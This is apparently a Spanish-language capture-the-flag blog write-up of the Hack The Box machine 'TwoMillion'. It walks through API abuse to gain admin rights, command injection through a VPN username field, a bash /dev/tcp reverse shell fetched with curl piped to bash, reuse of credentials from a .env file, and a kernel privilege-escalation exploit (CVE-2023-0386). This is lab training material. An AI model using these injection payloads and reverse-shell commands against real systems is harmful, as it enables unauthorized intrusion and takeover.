<!DOCTYPE html>
<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">

    <title>Máquina 1</title>


    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
    </head>


<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>


    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./TwoMillion.JPG"> <span class="mono authors"> <a href="https://juanchan.es/assets/maquinas/TwoMillion.html" itemprop="name">TwoMillion</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">




<h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos tcp</h2>
<pre><code class="language-bash">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>&nbsp;</p>
<h2 id="2-intrusión">2. Intrusión</h2>
<p>Si revisamos la página web, vemos que para registrarnos necesitamos un codigo de invitacion. Dicho código se introduce en el endpoint <code>http://2million.htb/invite</code>. Revisando en el <strong>Debugger</strong> de nuestro navegador, podemos ver el archivo <code>invitesapi.js</code>, el cual tiene el siguiente contenido:</p>
<pre><code class="language-bash">eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    };
    if (!&#39;&#39;.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }];
        e = function() {
            return &#39;\\w+&#39;
        };
        c = 1
    };
    while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp(&#39;\\b&#39; + e(c) + &#39;\\b&#39;, &#39;g&#39;), k[c])
        }
    }
    return p
}(&#39;1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#39;/d/e/n\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:\&#39;/d/e/k/l/m\&#39;,
c:1(0){3.2(0)},f:1(0){3.2(0)}})}&#39;, 24, 24, &#39;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1
|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#39;.split(&#39;|&#39;), 0, {}))
</code></pre>
<p>Es una función con código ofuscado en JavaScript que usa una técnica llamada &quot;Packer&quot;. Si lo desciframos con cualquier herramienta online obtenemos lo siguiente:</p>
<p>``bash
function verifyInviteCode(code) {
    var formData = { &quot;code&quot;: code };
    $.ajax({
        type: &quot;POST&quot;,
        dataType: &quot;json&quot;,
        data: formData,
        url: &#39;/api/v1/invite/verify&#39;,
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}</p>
<p>function makeInviteCode() {
    $.ajax({
        type: &quot;POST&quot;,
        dataType: &quot;json&quot;,
        url: &#39;/api/v1/invite/how/to/generate&#39;,
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}</p>
<pre><code>
Con **burp** lanzamos la peticion POST a `/api/v1/invite/how/to/generate` y nos devuelve la siguiente respuesta:

```bash
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 22 Feb 2025 19:27:27 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 249

{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;data&quot;:&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&quot;,&quot;enctype&quot;:&quot;ROT13&quot;},
&quot;hint&quot;:&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;}
</code></pre>
<p>Si en <strong>dcode.fr</strong> desciframos con el algoritmo &quot;Rot13&quot; la cadena data, obtenemos lo siguiente:</p>
<pre><code class="language-bash">In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
</code></pre>
<p>Realizamos entonces una peticion POST a dicho endpoint, de nuevo con burp, y obtenemos la siguiente respuesta:</p>
<pre><code class="language-bash">HTTP/1.1 200 OK
Server: nginx
Date: Sat, 22 Feb 2025 19:31:03 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 91

{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;VENKQU8tUDlNNE8tUU1LNVUtSFlNTVc=&quot;,&quot;format&quot;:&quot;encoded&quot;}}
</code></pre>
<p>Si decodificamos la cadena &quot;code&quot; en base64, obtenemos el siguiente código de invitación:</p>
<pre><code class="language-bash">TCJAO-P9M4O-QMK5U-HYMMW
</code></pre>
<p>Creamos entonces un usuaron con dicho código, y los siguientes credenciales: <code>test12@test.com - test</code>. Una vez autenticados, podemos hacer una petición Get al endpoint <code>/api/v1</code> y observamos lo siguiente:</p>
<pre><code class="language-bash">HTTP/1.1 200 OK
Server: nginx
Date: Sat, 22 Feb 2025 21:18:51 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 800

{&quot;v1&quot;:{
    &quot;user&quot;:{
        &quot;GET&quot;:{&quot;\/api\/v1&quot;:&quot;Route List&quot;,
                &quot;\/api\/v1\/invite\/how\/to\/generate&quot;:&quot;Instructions on invite code generation&quot;,
                &quot;\/api\/v1\/invite\/generate&quot;:&quot;Generate invite code&quot;,
                &quot;\/api\/v1\/invite\/verify&quot;:&quot;Verify invite code&quot;,
                &quot;\/api\/v1\/user\/auth&quot;:&quot;Check if user is authenticated&quot;,
                &quot;\/api\/v1\/user\/vpn\/generate&quot;:&quot;Generate a new VPN configuration&quot;,
                &quot;\/api\/v1\/user\/vpn\/regenerate&quot;:&quot;Regenerate VPN configuration&quot;,
                &quot;\/api\/v1\/user\/vpn\/download&quot;:&quot;Download OVPN file&quot;},
        &quot;POST&quot;:{&quot;\/api\/v1\/user\/register&quot;:&quot;Register a new user&quot;,
                &quot;\/api\/v1\/user\/login&quot;:&quot;Login with existing user&quot;}},
    &quot;admin&quot;:{
        &quot;GET&quot;:{&quot;\/api\/v1\/admin\/auth&quot;:&quot;Check if user is admin&quot;},
        &quot;POST&quot;:{&quot;\/api\/v1\/admin\/vpn\/generate&quot;:&quot;Generate VPN for specific user&quot;},
        &quot;PUT&quot;:{&quot;\/api\/v1\/admin\/settings\/update&quot;:&quot;Update user settings&quot;}}}}
</code></pre>
<p>Descubrimos entonces que si lanzamos una petición al enpoint <code>/api/v1/admin/settings/update</code>, podemos convertir a nuestro usuario en usuario administrador. Podemos ir sabiendo los parametros que se tienen que enviar, porque la aplicacion va respondiendo con los errores y parametros esperados, quedando entonces la siguiente petición:</p>
<pre><code class="language-bash">PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-type: application/json
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=94mkp60v47us7k2phetlttrosh
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 55

{&quot;email&quot;:&quot;test12@test.com&quot;,
        &quot;is_admin&quot;:     1
}
</code></pre>
<p>Con esto podemos acceder a los otros métodos disponibles para admin. Uno de ellos es ,el que nos permite generar un certificado vpn, mediante el endpoint <code>/api/v1/admin/vpn/generate</code>. Vemos como la app nos pide un campo de usuario, y podemos probar a realizar una inyección de comandos, mediante dicho campo:</p>
<pre><code class="language-bash">POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-type: application/json
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=94mkp60v47us7k2phetlttrosh
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 41

{ &quot;username&quot;: &quot;admin;cat /etc/passwd;&quot;} 
</code></pre>
<p>Y recibimos como respuesta lo siguiente:</p>
<pre><code class="language-bash">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000::/home/admin:/bin/bash
memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
</code></pre>
<p>Lanzamos entonces una revershell para entablar una conexión con dicha máquina. Para ello creamos un archivo <code>index.html</code> con el siguiente contenido:</p>
<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/10.10.14.118/9001 0&gt;&amp;1
</code></pre>
<p>Y exponemos dicho archivo a través de un server http en nuestra máquina:</p>
<pre><code class="language-bash"># python3 -m http.server 80
</code></pre>
<p>Y lanzamos <strong>nc</strong> para escuchar a través del puerto 9001:</p>
<pre><code class="language-bash"># nc -lnvp 9001
</code></pre>
<p>Y lanzamos la siguiente petición web:</p>
<pre><code class="language-bash">POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-type: application/json
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=94mkp60v47us7k2phetlttrosh
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 41

{ &quot;username&quot;: &quot;admin;curl http://10.10.14.118|bash;&quot;}
</code></pre>
<p>Y somos capaces de acceder como usuario www-data.</p>
<p>&nbsp;</p>
<h2 id="3-movimiento-lateral">3. Movimiento lateral</h2>
<p>Empezamos a enumerar directorios y archivos y encontramos el siguiente archivo:</p>
<pre><code class="language-bash">www-data@2million:~/html$ cat .env 
    DB_HOST=127.0.0.1
    DB_DATABASE=htb_prod
    DB_USERNAME=admin
    DB_PASSWORD=SuperDuperPass123
</code></pre>
<p>Si probamos a conectarnos por ssh, con dichas credenciales vemos que logramos acceder, y conseguir así la flag de usuario.</p>
<p>&nbsp;</p>
<h2 id="4-escalado-de-privilegios">4. Escalado de privilegios</h2>
<p>En el email del usuario admin vemos el siguiente correo:</p>
<pre><code class="language-bash">$ cat admin 
    From: ch4p &lt;ch4p@2million.htb&gt;
    To: admin &lt;admin@2million.htb&gt;
    Cc: g0blin &lt;g0blin@2million.htb&gt;
    Subject: Urgent: Patch System OS
    Date: Tue, 1 June 2023 10:45:22 -0700
    Message-ID: &lt;9876543210@2million.htb&gt;
    X-Mailer: ThunderMail Pro 5.2

    Hey admin,

    I&#39;m know you&#39;re working as fast as you can to do the DB migration. While we&#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs 
    already this year. That one in OverlayFS / FUSE looks nasty. We can&#39;t get popped by that.

    HTB Godfather
</code></pre>
<p>Si buscamos en google por dicho CVE, encontramos el siguiente repo de Github: <a href="https://github.com/puckiestyle/CVE-2023-0386">https://github.com/puckiestyle/CVE-2023-0386</a>. Lo pasamos a través de scp y ejecutamos en dos terminales distintas, tal y como se nos espicifica en el exploit:</p>
<pre><code class="language-bash"># ./fuse ./ovlcap/lower ./gc
</code></pre>
<pre><code class="language-bash"># ./exp
</code></pre>
<p>Y ya nos podemos hacer root con el comando <code># sudo su</code> y obtener así la flag del usuario root.</p>
<pre><code>        Y conseguimos la flag de root
</code></pre>





<p>&nbsp;</p><p>&nbsp;</p>
</div>
     <div class="footer-credits" style="display: flex; justify-content: flex-end">
        <a> Made by Juan González </a>
    </div>
</div>
</body></html>
